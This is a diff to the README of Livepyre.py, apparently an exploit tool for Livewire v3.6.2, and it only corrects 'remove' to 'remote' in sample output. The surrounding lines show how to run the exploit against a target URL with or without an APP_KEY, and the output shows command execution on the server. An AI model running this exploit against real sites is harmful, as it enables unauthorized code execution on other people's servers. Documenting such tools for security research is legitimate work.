@@ -45,7 +45,7 @@ $ ./Livepyre.py -u https://target.com/
 ```sh
 # Without the APP_KEY and if an object type is in snapshot
 $ ./Livepyre.py -u http://livewire.local/counter
-[INFO] The remove livewire version is v3.6.2, the target is vulnerable.
+[INFO] The remote livewire version is v3.6.2, the target is vulnerable.
 [INFO] Found snapshot(s). Running exploit.
 [INFO] Running exploit without APP_KEY.
 [INFO] Found 1 snapshot(s) available.
@@ -58,7 +58,7 @@ uid=1337(sail) gid=33(www-data) groups=33(www-data)
 
 # Without the APP_KEY with bruteforce if there isn't any object type in snapshot
 $ ./Livepyre.py -u http://livewire.local/counter
-[INFO] The remove livewire version is v3.6.2, the target is vulnerable.
+[INFO] The remote livewire version is v3.6.2, the target is vulnerable.
 [INFO] Found snapshot(s). Running exploit.
 [INFO] Running exploit without APP_KEY.
 [INFO] Found 1 snapshot(s) available.
@@ -72,7 +72,7 @@ uid=1337(sail) gid=33(www-data) groups=33(www-data)
 
 # With the APP_KEY
 $ ./Livepyre.py -u http://livewire.local/counter -a 'base64:CGhMqYXFMzbOe048WS6a0iG8f6bBcTLVbP36bqqrvuA='
-[INFO] The remove livewire version is v3.6.2, the target is vulnerable.
+[INFO] The remote livewire version is v3.6.2, the target is vulnerable.
 [INFO] Found snapshot(s). Running exploit.
 [INFO] Running exploit with APP_KEY.
 [INFO] Found 1 snapshot(s) available.
